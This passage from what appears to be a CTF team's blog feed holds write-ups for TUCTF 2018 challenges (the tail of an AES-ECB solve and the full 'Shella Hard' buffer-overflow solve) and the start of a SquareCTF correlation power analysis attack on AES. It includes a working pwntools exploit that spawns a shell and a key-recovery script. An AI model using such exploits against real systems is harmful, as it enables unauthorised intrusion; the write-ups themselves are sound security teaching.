class="built_in">local</span> process <span class="string">'./redacted.py'</span>: pid 11451</span><br><span class="line">Enter your text here: </span><br><span class="line">TUCTF&#123;A3S_3CB_1S&#125;</span><br><span class="line">TUCTF&#123;A3S_3CB_1S!&#125;</span><br><span class="line">TUCTF&#123;A3S_3CB_1S!!&#125;</span><br><span class="line">TUCTF&#123;A3S_3CB_1S!!!&#125;</span><br><span class="line">TUCTF&#123;A3S_3CB_1S!!!!&#125;</span><br><span class="line">TUCTF&#123;A3S_3CB_1S3!!!!&#125;</span><br><span class="line">TUCTF&#123;A3S_3CB_1SL3!!!!&#125;</span><br><span class="line">TUCTF&#123;A3S_3CB_1SBL3!!!!&#125;</span><br><span class="line">TUCTF&#123;A3S_3CB_1S4BL3!!!!&#125;</span><br><span class="line">TUCTF&#123;A3S_3CB_1SR4BL3!!!!&#125;</span><br><span class="line">TUCTF&#123;A3S_3CB_1S3R4BL3!!!!&#125;</span><br><span class="line">TUCTF&#123;A3S_3CB_1SN3R4BL3!!!!&#125;</span><br><span class="line">TUCTF&#123;A3S_3CB_1SLN3R4BL3!!!!&#125;</span><br><span class="line">TUCTF&#123;A3S_3CB_1SULN3R4BL3!!!!&#125;</span><br><span class="line">TUCTF&#123;A3S_3CB_1SVULN3R4BL3!!!!&#125;</span><br><span class="line">TUCTF&#123;A3S_3CB_1S_VULN3R4BL3!!!!&#125;</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;&lt;br&gt;AESential Lesson&lt;br&gt;465&lt;br&gt;&lt;br&gt;Thought I’d give you an essential lesson to how you shouldn’t get input for AES in ECB mode.&lt;
      
    
    </summary>
    
      <category term="Crypto" scheme="https://teamrocketist.github.io/categories/Crypto/"/>
    
    
      <category term="aes" scheme="https://teamrocketist.github.io/tags/aes/"/>
    
      <category term="ecb" scheme="https://teamrocketist.github.io/tags/ecb/"/>
    
      <category term="tuctf2018" scheme="https://teamrocketist.github.io/tags/tuctf2018/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] TUCTF 2018 - Shella Hard</title>
    <link href="https://teamrocketist.github.io/2018/11/26/Pwn-TUCTF-2018-Shella-Hard/"/>
    <id>https://teamrocketist.github.io/2018/11/26/Pwn-TUCTF-2018-Shella-Hard/</id>
    <published>2018-11-26T01:07:48.000Z</published>
    <updated>2018-11-26T01:14:52.585Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>Shella Hard<br>475<br><br>Difficulty: mind-melting hard<br>This program is crap! Is there even anything here?<br><br>nc 3.16.169.157 12345<br><br></blockquote><p>We were given a 32 bit binary:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ file shella-hard </span><br><span class="line">shella-hard: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=4bf12a273afc940e93699d77a19496b781e88246, not stripped</span><br></pre></td></tr></table></figure><p>Checking it’s security we can see we have <strong>NX enabled</strong>:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec shella-hard</span><br><span class="line">[*] &apos;/ctf/work/ctf/tuctf2018/pwn/shella-hard/shella-hard&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure></p><p>Now looking at the main function on radare2:<br><img src="https://i.imgur.com/4kHNIuW.png" alt=""></p><p>We can easily see we have a buffer overflow here, the <strong>buf</strong> is located at <strong>ebp-0x10</strong> and we are allowed to read up to 0x30 bytes with the <strong>read</strong> instruction, perhaps we have some limitations, we have a very limited space it only overflows 0x20 bytes from the buffer so we can’t create a very big <strong>rop chain</strong>, the binary is <strong>dynamic linked</strong> and the admins didn’t provide any <strong>libc</strong> file, even when not provided we can still use <img src="libc-database" alt="https://github.com/niklasb/libc-database"> to find it , but we don’t have any way of leaking addresses, because the binary doesn’t use any function that spits the output to the stdout like <strong>printf</strong>, <strong>puts</strong> or even <strong>write</strong>.</p><p>So since we can’t do anything of this the admins probably provided a way of creating a shell within the code, as we can see in radare we have a function named <strong>giveShell</strong>, which uses <strong>execve</strong>:<br><a data-fancybox="gallery" href="https://i.imgur.com/2i3tBMQ.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/2i3tBMQ.png" alt=""><br></a></p><p>After calculating the offsets to the return address we get something like this:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">return</span> process(<span class="string">'./shella-hard'</span>, aslr=<span class="keyword">False</span>, env=&#123;&#125;) <span class="keyword">if</span> local <span class="keyword">else</span> remote(<span class="string">'3.16.169.157'</span>, <span class="number">12345</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="keyword">True</span></span><br><span class="line">debug = <span class="keyword">True</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'new-window'</span>]</span><br><span class="line">binary = ELF(<span class="string">'./shella-hard'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GIVESHELL = <span class="number">0x0804845c</span></span><br><span class="line">r = getConn()</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">  gdb.attach(r, <span class="string">"""b main</span></span><br><span class="line"><span class="string">b *0x08048457</span></span><br><span class="line"><span class="string">b *0x08048467</span></span><br><span class="line"><span class="string">b *0x08048449</span></span><br><span class="line"><span class="string">c"""</span>)</span><br><span class="line">r.send(<span class="string">'A'</span>* <span class="number">20</span> + p32(GIVESHELL))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></p><p>But as we can see it looks broken? the address <strong>0x6a006a44</strong> will make us to crash into a <strong>page fault</strong>, as we can see here on gdb if we try to jump immediately into that function:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/KlGtbmw.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/KlGtbmw.png" alt=""><br></a></p><p>After loosing some time and trying another things I remembered reading a paper about a cool <strong>ROP</strong> technique to find “hidden” rop gadgets, but what’s a hidden rop gadget? Let’s take an example:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">8049166: 66 90                 xchg   %ax,%ax</span><br><span class="line">8049168: 80 3c 1f c3           cmpb   $0xc3,(%edi,%ebx,1)</span><br></pre></td></tr></table></figure><p>For example this could be a sample snippet from <strong>objdump</strong>.</p><p>The first column is the address of the instruction.</p><p>The second column is the hexadecimal code (machine code) of the x86 instruction.</p><p>The last column is the assembly instruction itself, in ASCII human readable format, with mnemonic and operands etc.</p><p>You can notice the presence of the value 0xc3 as the last byte of the second instruction.</p><p>This value is really important because it happens to be the machine code for the “ret” instruction.</p><p>So the trick here is to jump into the middle of this instruction:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmpb $0xc3,(%edi,%ebx,1)</span><br></pre></td></tr></table></figure><p>For instance at address <strong>0x8049166a</strong>. The CPU would see the following machine code sequence:<br><code>1f c3</code></p><p>Which will be interpreted as:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">00000000 &lt;.data&gt;:</span><br><span class="line">   0: 1f                    pop    %ds</span><br><span class="line">   1: c3                    ret</span><br></pre></td></tr></table></figure><p>Finding a hidden <strong>rop gadget</strong>, we can use the same idea in the function <strong>givenShell</strong>: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">/ (fcn) sym.giveShell 26</span><br><span class="line">|   sym.giveShell ();</span><br><span class="line">|           0x08048458      55             push ebp</span><br><span class="line">|           0x08048459      89e5           mov ebp, esp</span><br><span class="line">|           0x0804845b      90             nop</span><br><span class="line">|           0x0804845c      a1446a006a     mov eax, dword [0x6a006a44] ; [0x6a006a44:4]=-1</span><br><span class="line">|           0x08048461      006800         add byte [eax], ch</span><br><span class="line">|           0x08048464      850408         test dword [eax + ecx], eax ; [0x13:4]=-1 ; 19</span><br><span class="line">|           0x08048467      e8b4feffff     call sym.imp.execve</span><br><span class="line">|           0x0804846c      83c40c         add esp, 0xc</span><br><span class="line">|           0x0804846f      90             nop</span><br><span class="line">|           0x08048470      c9             leave</span><br><span class="line">\           0x08048471      c3             ret</span><br><span class="line">[0x08048340]&gt;</span><br></pre></td></tr></table></figure><p>What I did was to jump into the middle of:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|           0x0804845c      a1446a006a     mov eax, dword [0x6a006a44] ; [0x6a006a44:4]=-1</span><br></pre></td></tr></table></figure></p><p>So lets see what happens what’s the “transformation” in radare if we jump into the middle:</p><p><a data-fancybox="gallery" href="https://i.imgur.com/QVNPHVS.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/QVNPHVS.png" alt=""><br></a></p><p>This is perfect! we get exactly what we need for spawning a shell! it even reveals there was a global with a “/bin/sh” string that I didn’t even found.</p><p>Now fixing our python script: </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ python shella-hard.py</span><br><span class="line">[*] <span class="string">'/ctf/work/ctf/tuctf2018/pwn/shella-hard/shella-hard'</span></span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (<span class="number">0x8048000</span>)</span><br><span class="line">[+] Starting local process <span class="string">'./shella-hard'</span>: pid <span class="number">1190</span></span><br><span class="line">[!] ASLR <span class="keyword">is</span> disabled!</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ ls</span><br><span class="line">core  flag  output32  shella-hard  shella-hard.py  wtf.c</span><br><span class="line">$ cat flag</span><br><span class="line">flag&#123;test-flag-here&#125;</span><br></pre></td></tr></table></figure><p>No real flag here, unfortunately the admins shut down the challenges right after the challenges so I can only show it working locally and I don’t remember the real flag, anyway it doesn’t really matter.</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;&lt;br&gt;Shella Hard&lt;br&gt;475&lt;br&gt;&lt;br&gt;Difficulty: mind-melting hard&lt;br&gt;This program is crap! Is there even anything here?&lt;br&gt;&lt;br&gt;nc 3.16
      
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
      <category term="x86" scheme="https://teamrocketist.github.io/categories/Pwn/x86/"/>
    
      <category term="Stack Issue" scheme="https://teamrocketist.github.io/categories/Pwn/x86/Stack-Issue/"/>
    
      <category term="Stack Overflow" scheme="https://teamrocketist.github.io/categories/Pwn/x86/Stack-Issue/Stack-Overflow/"/>
    
    
      <category term="tuctf2018" scheme="https://teamrocketist.github.io/tags/tuctf2018/"/>
    
      <category term="rop" scheme="https://teamrocketist.github.io/tags/rop/"/>
    
      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
    
      <category term="jump_middle_instruction" scheme="https://teamrocketist.github.io/tags/jump-middle-instruction/"/>
    
  </entry>
  
  <entry>
    <title>[Crypto] SquareCtf 2018 - C4: leaky power</title>
    <link href="https://teamrocketist.github.io/2018/11/14/Crypto-SquareCtf-2018-C4-leaky-power/"/>
    <id>https://teamrocketist.github.io/2018/11/14/Crypto-SquareCtf-2018-C4-leaky-power/</id>
    <published>2018-11-14T16:59:54.000Z</published>
    <updated>2018-11-14T17:22:56.511Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>C4: leaky power<br>222<br><br>C4 is a very advanced AES based defensive system. You are able to monitor the power lines. Is that enough?<br><br>You’re given three files:<br><br>    powertraces.npy: Measurements (over time) of power consumption of a chip while performing AES encryption<br>    #: Corresponding plaintext inputs that were encrypted<br>    instructions.jwe: File encrypted using the same key as plaintexts.npy.<br><br>note: The first two files are NumPy arrays.<br><br>note: there’s a mistake in the way instructions.jwe was created (the algorithm is A128GCM, not A256GCM).<br><br></blockquote><p>The encryption used is <strong>AES</strong>, from reading the challenge description we know we eventually were able to monitor the powerlines having some power traces on <strong>powertraces.npy</strong> and the corresponding plaintexts used on <strong>plaintexts.npy</strong>, the ciphertext we want to decrypt is located at <strong>instructions.jwe</strong>.</p><p>We have some power traces so we will need to use some kind of <strong>side-channel analysis</strong>:</p><p>In <strong>CPA (Correlation power analysis)</strong> the goal is to accurately produce a <strong>power model</strong> of the device under attack. During an attack, the aim is to find <strong><a href="https://en.wikipedia.org/wiki/Correlation_and_dependence" target="_blank" rel="noopener">Correlation</a></strong> between a <strong>predicted output</strong> and <strong>the actual power output</strong> of a device. If the power model is <strong>accurate</strong> then a strong correlation should be demonstrated between the predicted output and actual output. If this correlation is <strong>found</strong> then, gathering a <strong>large</strong> number of traces will enable one to show that the correctly predicted <strong>cipher key</strong> will demonstrate the <strong>highest level of correlation</strong>.</p><p>One power model which may be used is the <strong>Hamming Weight Power Model</strong>. Traditionally, the Hamming weight of a value is the number of <strong>non-zeroes</strong>. For example, in the binary number <strong>1100 0010</strong> the Hamming weight would be <strong>3</strong>. The assumption in using the Hamming Weight Power Model in power analysis attacks is that the <strong>number of bits</strong> set to 0 or 1 of an output is <strong>correlated</strong> with the <strong>power consumption</strong> of a device. The Hamming weight itself is then used as an arbitrary unit to model the consumption of power in a device. <strong>Hamming weight units</strong> can then be compared to the actual voltage levels of power traces captured when a device was performing cryptographic operations. This act of comparison is the process of finding correlation between <strong>the modelled power unit values</strong> and the <strong>actual power consumed</strong>.</p><p>One technique to calculate <strong>correlation</strong> between the <strong>power model</strong> and the <strong>actual power consumption</strong> is to use <strong>Pearson correlation coefficient equation</strong>. In essence, this equation will take two sets data <strong>(X and Y)</strong> and calculate whether there is a linear (positive or negative) <strong>correlation</strong> between the two sets of values. We may use this equation to <strong>find significance in our power traces</strong> since the assumption with the Hamming Weight Power Model is that as the number of 1’s increase in our predicted output, so too does the power consumption increase in the actual output (and vice versa).</p><p><a data-fancybox="gallery" href="https://wikimedia.org/api/rest_v1/media/math/render/svg/60e3f3116e2923c792aafb904dcac308624a1d77" target="_blank" rel="noopener"><br><img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/60e3f3116e2923c792aafb904dcac308624a1d77" alt=""><br><em>Figure 1 - Pearson correlation coefficient equation</em><br></a></p><h1 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h1><p>At the start of encryption, the plaintext values (the data to be encrypted) and the cipher key values (the key used for encryption and decryption purposes) will be each arranged into a 4×4 matrix in the positions as shown in <strong>Figure 2</strong>. Each value in this matrix holds 1 byte of data. During the <strong>AddRoundKey</strong> step, each plaintext value is XOR’d with a cipher key value at a matching position in the 4×4 matrix.</p><p><a data-fancybox="gallery" href="https://www.tandfonline.com/na101/home/literatum/publisher/tandf/journals/content/tsec20/2017/tsec20.v001.i02/23742917.2016.1231523/20170804/images/medium/tsec_a_1231523_f0003_b.gif" target="_blank" rel="noopener"><br><img src="https://www.tandfonline.com/na101/home/literatum/publisher/tandf/journals/content/tsec20/2017/tsec20.v001.i02/23742917.2016.1231523/20170804/images/medium/tsec_a_1231523_f0003_b.gif" alt=""><br><em>Figure 2. Plaintext and cipher key arrangement.</em><br></a></p><p>After <strong>AddRoundKey</strong>, the <strong>SubBytes</strong> step will use the result produced by <strong>Pi⊕ Ki</strong> as a lookup for a value stored in the <strong>Rijndael S-box</strong>. The <strong>S-box</strong> output will replace <strong>Pi⊕ Ki</strong>. The S-box is a 16×16 matrix of values which remains constant for all AES implementations. Each position in the 16×16 matrix will hold 1 byte of data.<br><a data-fancybox="gallery" href="https://i.imgur.com/TDliwlN.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/TDliwlN.png" alt=""><br><em>Figure 3 - Rijndael S-box</em><br></a></p><p>For example if the result of <strong>Pi ⊕ Ki</strong> is <strong>c5</strong> then we look for in the sbox table for the line <strong>c</strong> and the column <strong>5</strong> and we obtain the value <strong>a6</strong>.</p><p>In the context of CPA attack implemented aim to <strong>exploit</strong> the fact that information may be <strong>leaked</strong> if one was to monitor the power consumption of a cryptographic device during the point in which the <strong>S-box lookup</strong> is <strong>carried out</strong>.</p><h1 id="Writing-Python-Script-of-CPA"><a href="#Writing-Python-Script-of-CPA" class="headerlink" title="Writing Python Script of CPA"></a>Writing Python Script of CPA</h1><p>Both this files are <strong>numpy arrays</strong>, they can be loaded into python by using the <strong>numpy.load</strong> function:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">traces = np.load(<span class="string">'powertraces.npy'</span>)</span><br><span class="line">pt = np.load(<span class="string">'plaintexts.npy'</span>)</span><br></pre></td></tr></table></figure><p>Now for each we want to create some <strong>hypothesis</strong>, the range is between <strong>0x0</strong> to <strong>0xff</strong> (all possible bytes), this hypothesis are key guesses in which we will <strong>Xor</strong> them between with the plaintexts used and calculated it’s <strong>Hamming Weight</strong> : </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">sbox=(</span><br><span class="line"><span class="number">0x63</span>,<span class="number">0x7c</span>,<span class="number">0x77</span>,<span class="number">0x7b</span>,<span class="number">0xf2</span>,<span class="number">0x6b</span>,<span class="number">0x6f</span>,<span class="number">0xc5</span>,<span class="number">0x30</span>,<span class="number">0x01</span>,<span class="number">0x67</span>,<span class="number">0x2b</span>,<span class="number">0xfe</span>,<span class="number">0xd7</span>,<span class="number">0xab</span>,<span class="number">0x76</span>,</span><br><span class="line"><span class="number">0xca</span>,<span class="number">0x82</span>,<span class="number">0xc9</span>,<span class="number">0x7d</span>,<span class="number">0xfa</span>,<span class="number">0x59</span>,<span class="number">0x47</span>,<span class="number">0xf0</span>,<span class="number">0xad</span>,<span class="number">0xd4</span>,<span class="number">0xa2</span>,<span class="number">0xaf</span>,<span class="number">0x9c</span>,<span class="number">0xa4</span>,<span class="number">0x72</span>,<span class="number">0xc0</span>,</span><br><span class="line"><span class="number">0xb7</span>,<span class="number">0xfd</span>,<span class="number">0x93</span>,<span class="number">0x26</span>,<span class="number">0x36</span>,<span class="number">0x3f</span>,<span class="number">0xf7</span>,<span class="number">0xcc</span>,<span class="number">0x34</span>,<span class="number">0xa5</span>,<span class="number">0xe5</span>,<span class="number">0xf1</span>,<span class="number">0x71</span>,<span class="number">0xd8</span>,<span class="number">0x31</span>,<span class="number">0x15</span>,</span><br><span class="line"><span class="number">0x04</span>,<span class="number">0xc7</span>,<span class="number">0x23</span>,<span class="number">0xc3</span>,<span class="number">0x18</span>,<span class="number">0x96</span>,<span class="number">0x05</span>,<span class="number">0x9a</span>,<span class="number">0x07</span>,<span class="number">0x12</span>,<span class="number">0x80</span>,<span class="number">0xe2</span>,<span class="number">0xeb</span>,<span class="number">0x27</span>,<span class="number">0xb2</span>,<span class="number">0x75</span>,</span><br><span class="line"><span class="number">0x09</span>,<span class="number">0x83</span>,<span class="number">0x2c</span>,<span class="number">0x1a</span>,<span class="number">0x1b</span>,<span class="number">0x6e</span>,<span class="number">0x5a</span>,<span class="number">0xa0</span>,<span class="number">0x52</span>,<span class="number">0x3b</span>,<span class="number">0xd6</span>,<span class="number">0xb3</span>,<span class="number">0x29</span>,<span class="number">0xe3</span>,<span class="number">0x2f</span>,<span class="number">0x84</span>,</span><br><span class="line"><span class="number">0x53</span>,<span class="number">0xd1</span>,<span class="number">0x00</span>,<span class="number">0xed</span>,<span class="number">0x20</span>,<span class="number">0xfc</span>,<span class="number">0xb1</span>,<span class="number">0x5b</span>,<span class="number">0x6a</span>,<span class="number">0xcb</span>,<span class="number">0xbe</span>,<span class="number">0x39</span>,<span class="number">0x4a</span>,<span class="number">0x4c</span>,<span class="number">0x58</span>,<span class="number">0xcf</span>,</span><br><span class="line"><span class="number">0xd0</span>,<span class="number">0xef</span>,<span class="number">0xaa</span>,<span class="number">0xfb</span>,<span class="number">0x43</span>,<span class="number">0x4d</span>,<span class="number">0x33</span>,<span class="number">0x85</span>,<span class="number">0x45</span>,<span class="number">0xf9</span>,<span class="number">0x02</span>,<span class="number">0x7f</span>,<span class="number">0x50</span>,<span class="number">0x3c</span>,<span class="number">0x9f</span>,<span class="number">0xa8</span>,</span><br><span class="line"><span class="number">0x51</span>,<span class="number">0xa3</span>,<span class="number">0x40</span>,<span class="number">0x8f</span>,<span class="number">0x92</span>,<span class="number">0x9d</span>,<span class="number">0x38</span>,<span class="number">0xf5</span>,<span class="number">0xbc</span>,<span class="number">0xb6</span>,<span class="number">0xda</span>,<span class="number">0x21</span>,<span class="number">0x10</span>,<span class="number">0xff</span>,<span class="number">0xf3</span>,<span class="number">0xd2</span>,</span><br><span class="line"><span class="number">0xcd</span>,<span class="number">0x0c</span>,<span class="number">0x13</span>,<span class="number">0xec</span>,<span class="number">0x5f</span>,<span class="number">0x97</span>,<span class="number">0x44</span>,<span class="number">0x17</span>,<span class="number">0xc4</span>,<span class="number">0xa7</span>,<span class="number">0x7e</span>,<span class="number">0x3d</span>,<span class="number">0x64</span>,<span class="number">0x5d</span>,<span class="number">0x19</span>,<span class="number">0x73</span>,</span><br><span class="line"><span class="number">0x60</span>,<span class="number">0x81</span>,<span class="number">0x4f</span>,<span class="number">0xdc</span>,<span class="number">0x22</span>,<span class="number">0x2a</span>,<span class="number">0x90</span>,<span class="number">0x88</span>,<span class="number">0x46</span>,<span class="number">0xee</span>,<span class="number">0xb8</span>,<span class="number">0x14</span>,<span class="number">0xde</span>,<span class="number">0x5e</span>,<span class="number">0x0b</span>,<span class="number">0xdb</span>,</span><br><span class="line"><span class="number">0xe0</span>,<span class="number">0x32</span>,<span class="number">0x3a</span>,<span class="number">0x0a</span>,<span class="number">0x49</span>,<span class="number">0x06</span>,<span class="number">0x24</span>,<span class="number">0x5c</span>,<span class="number">0xc2</span>,<span class="number">0xd3</span>,<span class="number">0xac</span>,<span class="number">0x62</span>,<span class="number">0x91</span>,<span class="number">0x95</span>,<span class="number">0xe4</span>,<span class="number">0x79</span>,</span><br><span class="line"><span class="number">0xe7</span>,<span class="number">0xc8</span>,<span class="number">0x37</span>,<span class="number">0x6d</span>,<span class="number">0x8d</span>,<span class="number">0xd5</span>,<span class="number">0x4e</span>,<span class="number">0xa9</span>,<span class="number">0x6c</span>,<span class="number">0x56</span>,<span class="number">0xf4</span>,<span class="number">0xea</span>,<span class="number">0x65</span>,<span class="number">0x7a</span>,<span class="number">0xae</span>,<span class="number">0x08</span>,</span><br><span class="line"><span class="number">0xba</span>,<span class="number">0x78</span>,<span class="number">0x25</span>,<span class="number">0x2e</span>,<span class="number">0x1c</span>,<span class="number">0xa6</span>,<span class="number">0xb4</span>,<span class="number">0xc6</span>,<span class="number">0xe8</span>,<span class="number">0xdd</span>,<span class="number">0x74</span>,<span class="number">0x1f</span>,<span class="number">0x4b</span>,<span class="number">0xbd</span>,<span class="number">0x8b</span>,<span class="number">0x8a</span>,</span><br><span class="line"><span class="number">0x70</span>,<span class="number">0x3e</span>,<span class="number">0xb5</span>,<span class="number">0x66</span>,<span class="number">0x48</span>,<span class="number">0x03</span>,<span class="number">0xf6</span>,<span class="number">0x0e</span>,<span class="number">0x61</span>,<span class="number">0x35</span>,<span class="number">0x57</span>,<span class="number">0xb9</span>,<span class="number">0x86</span>,<span class="number">0xc1</span>,<span class="number">0x1d</span>,<span class="number">0x9e</span>,</span><br><span class="line"><span class="number">0xe1</span>,<span class="number">0xf8</span>,<span class="number">0x98</span>,<span class="number">0x11</span>,<span class="number">0x69</span>,<span class="number">0xd9</span>,<span class="number">0x8e</span>,<span class="number">0x94</span>,<span class="number">0x9b</span>,<span class="number">0x1e</span>,<span class="number">0x87</span>,<span class="number">0xe9</span>,<span class="number">0xce</span>,<span class="number">0x55</span>,<span class="number">0x28</span>,<span class="number">0xdf</span>,</span><br><span class="line"><span class="number">0x8c</span>,<span class="number">0xa1</span>,<span class="number">0x89</span>,<span class="number">0x0d</span>,<span class="number">0xbf</span>,<span class="number">0xe6</span>,<span class="number">0x42</span>,<span class="number">0x68</span>,<span class="number">0x41</span>,<span class="number">0x99</span>,<span class="number">0x2d</span>,<span class="number">0x0f</span>,<span class="number">0xb0</span>,<span class="number">0x54</span>,<span class="number">0xbb</span>,<span class="number">0x16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">intermediate</span><span class="params">(pt, keyguess)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> sbox[pt ^ keyguess]</span><br><span class="line"></span><br><span class="line">HW = [bin(n).count(<span class="string">"1"</span>) <span class="keyword">for</span> n <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">256</span>)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Aes key is 16 bytes so for each best guess</span></span><br><span class="line"><span class="keyword">for</span> bnum <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">16</span>):</span><br><span class="line">        cpaoutput = [<span class="number">0</span>]*<span class="number">256</span></span><br><span class="line">        maxcpa = [<span class="number">0</span>]*<span class="number">256</span></span><br><span class="line">        <span class="comment"># for each keyguess</span></span><br><span class="line">        <span class="keyword">for</span> kguess <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">256</span>):</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"Subkey %2d, hyp = %02x: "</span>%(bnum, kguess),</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="comment">#Initialize arrays &amp; variables to zero</span></span><br><span class="line">            sumnum = np.zeros(numpoint)</span><br><span class="line">            sumden1 = np.zeros(numpoint)</span><br><span class="line">            sumden2 = np.zeros(numpoint)</span><br><span class="line"></span><br><span class="line">            hyp = np.zeros(numtraces)</span><br><span class="line">            <span class="comment"># calculate every hamming distance for all the traces for this key guess</span></span><br><span class="line">            <span class="keyword">for</span> tnum <span class="keyword">in</span> range(<span class="number">0</span>, numtraces):</span><br><span class="line">                hyp[tnum] = HW[intermediate(pt[tnum][bnum], kguess)]</span><br></pre></td></tr></table></figure><p>Now still in the same loop we want to calculate the <strong>means</strong> of the <strong>hypothesis</strong> and the <strong>points of the trace</strong>, this comes from the correlation formula in <strong>Figure 2</strong>.<br>We can say that the two aleatory variable <strong>X</strong> and <strong>Y</strong> where <strong>X</strong> is the hamming distance of the key hypothesis for every character of plaintext tested and <strong>Y</strong> for every points power consumption points in every trace. So concluding the <strong>Xi</strong> in the formula is the first <strong>HW[intermediate(plaintext[x0][k0], kguess)]</strong> and <strong>yi</strong> is all the points in the power consumption trace, while <strong>x̅</strong>  is the mean of variable <strong>X</strong> and <strong>ȳ</strong> is the respective mean of variable 